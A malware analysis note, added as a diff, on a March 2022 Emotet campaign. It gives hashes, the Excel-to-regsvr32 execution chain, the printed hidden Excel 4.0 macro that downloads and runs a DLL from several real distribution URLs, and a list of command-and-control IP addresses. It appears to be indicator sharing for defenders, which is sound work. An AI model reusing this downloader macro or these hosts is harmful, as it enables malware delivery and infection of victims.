@@ -1,0 +1,117 @@
+Emotet 2022 | epoch4 | 15.03.2022 | 
+
+************************************************************************************************************
+
+.xls eb9f57507d13c1dd8dfa54329c72316456ccf895530a20354cc3a8bca82590d0
+.dll ab662880753e0828df60df0b117ba0bcc834532955e21da88528337853650059
+
+************************************************************************************************************
+
+Exec >>
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\INVOICE 15-03-2022_1828.xlsm
+
+regsvr32.exe -s ..\ujg.dll
+
+regsvr32.exe /s C:\Windows\SysWOW64\Jroqnfybblp\rgvvjraw.rrp
+
+************************************************************************************************************
+
+Hidden Macro Sheet - Obfuscation 
+=FORMULA(Tfv!D14,Tfvv!I12)=FORMULA(Ofgeg!P22&Ofgeg!H9&Ofgeg!L2&Ofgeg!B15&Ofgeg!B15&Vedve!E10&Vedve!H13&Ofgeg!F10&Vedve!J6&Tfvv!I12&Ofgeg!L2&Vedve!P12&Urdgv!K22&Vedve!E18&Urdgv!T20&Urdgv!G21,F7)=FORMULA(Ofgeg!P22&Ofgeg!J11&Ofgeg!B18&Ofgeg!P11&"BFVS1"&Urdgv!R10&Ofgeg!H9&Ofgeg!L2&Ofgeg!B15&Ofgeg!B15&Vedve!E10&Vedve!H13&Ofgeg!F10&Vedve!J6&Tfvv!I12&Ofgeg!L2&Vedve!P12&Urdgv!K22&Vedve!F20&Urdgv!T20&Urdgv!G21&Ofgeg!P13,F9)=FORMULA(Ofgeg!P22&Ofgeg!J11&Ofgeg!B18&Ofgeg!P11&"BFVS2"&Urdgv!R10&Ofgeg!H9&Ofgeg!L2&Ofgeg!B15&Ofgeg!B15&Vedve!E10&Vedve!H13&Ofgeg!F10&Vedve!J6&Tfvv!I12&Ofgeg!L2&Vedve!P12&Urdgv!K22&Vedve!G18&Urdgv!T20&Urdgv!G21&Ofgeg!P13,F11)=FORMULA(Ofgeg!P22&Ofgeg!J11&Ofgeg!B18&Ofgeg!P11&"BFVS3"&Urdgv!R10&Ofgeg!H9&Ofgeg!L2&Ofgeg!B15&Ofgeg!B15&Vedve!E10&Vedve!H13&Ofgeg!F10&Vedve!J6&Tfvv!I12&Ofgeg!L2&Vedve!P12&Urdgv!K22&Vedve!H20&Urdgv!T20&Urdgv!G21&Ofgeg!P13,F13)=FORMULA(Ofgeg!P22&Ofgeg!J11&Ofgeg!B18&Ofgeg!P11&"BFVS4"&Urdgv!R10&Ofgeg!H9&Ofgeg!L2&Ofgeg!B15&Ofgeg!B15&Vedve!E10&Vedve!H13&Ofgeg!F10&Vedve!J6&Tfvv!I12&Ofgeg!L2&Vedve!P12&Urdgv!K22&Vedve!I18&Urdgv!T20&Urdgv!G21&Ofgeg!P13,F15)=FORMULA(Ofgeg!P22&Ofgeg!J11&Ofgeg!B18&Ofgeg!P11&"BFVS5"&Urdgv!R10&Ofgeg!H9&Ofgeg!L2&Ofgeg!B15&Ofgeg!B15&Vedve!E10&Vedve!H13&Ofgeg!F10&Vedve!J6&Tfvv!I12&Ofgeg!L2&Vedve!P12&Urdgv!K22&Vedve!J20&Urdgv!T20&Urdgv!G21&Ofgeg!P13,F17)=FORMULA(Ofgeg!P22&Ofgeg!J11&Ofgeg!B18&Ofgeg!P11&"BFVS6"&Urdgv!R10&Ofgeg!H9&Ofgeg!L2&Ofgeg!B15&Ofgeg!B15&Vedve!E10&Vedve!H13&Ofgeg!F10&Vedve!J6&Tfvv!I12&Ofgeg!L2&Vedve!P12&Urdgv!K22&Vedve!K18&Urdgv!T20&Urdgv!G21&Ofgeg!P13,F19)=FORMULA(Ofgeg!P22&Ofgeg!J11&Ofgeg!B18&Ofgeg!P11&"BFVS7"&Urdgv!R10&Ofgeg!H9&Ofgeg!B15&Ofgeg!I17&Ofgeg!I3&Ofgeg!H13&Ofgeg!P11&Ofgeg!K9&Ofgeg!P13&Ofgeg!P7&Ofgeg!P13,F21)=FORMULA(Ofgeg!P22&Ofgeg!H13&Ofgeg!N4&Ofgeg!H13&Ofgeg!H9&Ofgeg!P11&Ofgeg!P15&Ofgeg!H9&Ofgeg!P20&Urdgv!N17&Urdgv!O13&Urdgv!J9&Vedve!N16&Urdgv!H15&Ofgeg!P15&Ofgeg!P13,F23)=FORMULA(Ofgeg!P22&Ofgeg!G24&Ofgeg!H13&Ofgeg!E6&Ofgeg!E11&Ofgeg!G24&Ofgeg!K23&Ofgeg!P11&Ofgeg!P13,F28)
+          
+          =CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"ttp"&"s://ba"&"llpo"&"int"&"me"&"dia.c"&"o"&"m/cs"&"s/WDv"&"vKlT"&"Tnc"&"g"&"ka"&"zP/","..\ujg.dll",0,0)
+          
+          =IF(BFVS1<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"tt"&"p://w"&"ww.a"&"lto"&"xi.co"&"m/U"&"Ic/04"&"Gt"&"HA"&"QG"&"A/","..\ujg.dll",0,0))
+          
+          =IF(BFVS2<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"tt"&"p://w"&"ww.a"&"pe"&"sb.c"&"om/la"&"ng"&"ua"&"ge/Ig"&"W"&"s7"&"RR"&"V/","..\ujg.dll",0,0))
+          
+          =IF(BFVS3<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"tt"&"p://w"&"ww.a"&"ra-c"&"ho"&"ob.c"&"om/da"&"ta1/T"&"zm"&"3xs"&"CsT"&"4DS"&"cd"&"UF"&"Ox/","..\ujg.dll",0,0))
+          
+          =IF(BFVS4<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"ht"&"tp://w"&"ww.t"&"ech"&"ni"&"qu"&"es"&"bro"&"adb"&"an"&"d.n"&"et/p"&"ay/B"&"xp/","..\ujg.dll",0,0))
+          
+          =IF(BFVS5<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"tt"&"p://w"&"w"&"w.a"&"risg"&"ea"&"rs.c"&"om/c"&"gi-b"&"in/d"&"ke"&"Y/","..\ujg.dll",0,0))
+          
+          =IF(BFVS6<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"ttp"&"s://w"&"ww.m"&"anc"&"hes"&"te"&"rsl"&"t.c"&"o.u"&"k/a-t"&"o-z-o"&"f-sl"&"t/rN"&"rJK"&"OM2"&"h/","..\ujg.dll",0,0))
+          
+          =IF(BFVS7<0, CLOSE(0),)
+          
+          =EXEC("C:\Windows\SysWow64\re"&"gs"&"v"&"r3"&"2.e"&"x"&"e -s ..\ujg.dll")
+          
+          
+          
+          
+          =RETURN()      
+                      
+
+************************************************************************************************************
+
+.dll distro
+
+https://ballpointmedia.com/css/WDvvKlTTncgkazP/
+http://www.altoxi.com/UIc/04GtHAQGA/
+http://www.apesb.com/language/IgWs7RRV/
+http://www.ara-choob.com/data1/Tzm3xsCsT4DScdUFOx/
+http://www.techniquesbroadband.net/pay/Bxp/
+http://www.arisgears.com/cgi-bin/dkeY/
+https://www.manchesterslt.co.uk/a-to-z-of-slt/rNrJKOM2h/
+
+Network
+
+https://217.182.143.248:8080/PUJMsBAPVmIsRLtiBlHHiQUdMZvkVUUkYLyYp
+
+c2's
+
+217.182.143.248:8080
+185.4.135.27:8080
+192.99.251.50:443
+146.59.226.45:443
+162.214.118.104:8080
+195.154.133.20:443
+103.75.201.2:443
+5.9.116.246:8080
+177.87.70.10:8080
+31.24.158.56:8080
+103.75.201.4:443
+158.69.222.101:443
+185.157.82.211:8080
+185.8.212.130:7080
+186.250.48.117:7080
+110.232.117.186:8080
+46.55.222.11:443
+196.218.30.83:443
+51.91.7.5:8080
+176.56.128.118:443
+207.38.84.195:8080
+173.212.193.249:8080
+45.118.135.203:7080
+164.68.99.3:8080
+209.126.98.206:8080
+212.24.98.99:8080
+151.106.112.196:8080
+45.176.232.124:443
+153.126.146.25:7080
+212.237.17.99:8080
+45.142.114.231:8080
+107.182.225.142:8080
+45.118.115.99:8080
+79.172.212.216:8080
+50.30.40.196:8080
+82.165.152.127:8080
+50.116.54.215:443
+1.234.2.232:8080
+58.227.42.236:80
+216.158.226.206:443
+159.8.59.82:8080
+129.232.188.93:443
+189.126.111.200:7080
+138.185.72.26:8080
+159.65.88.10:8080
+103.221.221.247:8080
+188.44.20.25:443
+203.114.109.124:443
+197.242.150.244:8080
+51.254.140.238:7080
+176.104.106.96:8080
+178.79.147.66:8080
+131.100.24.231:80
